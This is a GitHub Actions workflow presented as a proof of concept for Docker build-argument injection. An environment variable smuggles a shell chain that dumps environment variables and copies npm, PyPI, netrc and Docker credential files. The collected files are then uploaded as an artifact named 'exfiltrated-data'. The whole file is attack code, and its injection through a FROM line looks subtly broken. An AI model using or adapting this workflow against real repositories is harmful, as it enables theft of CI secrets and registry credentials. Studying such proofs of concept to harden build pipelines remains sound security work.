name: Enhanced ARG Injection PoC

on:
  push:

jobs:
  exploit:
    runs-on: ubuntu-latest
    env:
      PYTHON_VERSION: 'alpine && mkdir /leaks && printenv > /leaks/env.txt && cp -f /root/.npmrc /leaks/npmrc.txt 2>/dev/null || true && cp -f /root/.pypirc /leaks/pypirc.txt 2>/dev/null || true && cp -f /root/.netrc /leaks/netrc.txt 2>/dev/null || true && cp -f /root/.docker/config.json /leaks/docker-config.txt 2>/dev/null || true'
    steps:
      - name: Checkout repo
        uses: actions/checkout@v4

      - name: Create malicious Dockerfile
        run: |
          echo 'ARG PYTHON_VERSION' > Dockerfile
          echo 'FROM ${PYTHON_VERSION}' >> Dockerfile
          echo 'RUN echo "Executed payload" && ls /leaks' >> Dockerfile

      - name: Build the malicious image
        run: docker build -t exfil-image .

      - name: Run the container to extract files
        run: |
          docker run --rm exfil-image sh -c 'cat /leaks/*' > full_leak.txt

      - name: Upload all exfiltrated data
        uses: actions/upload-artifact@v4
        with:
          name: exfiltrated-data
          path: full_leak.txt
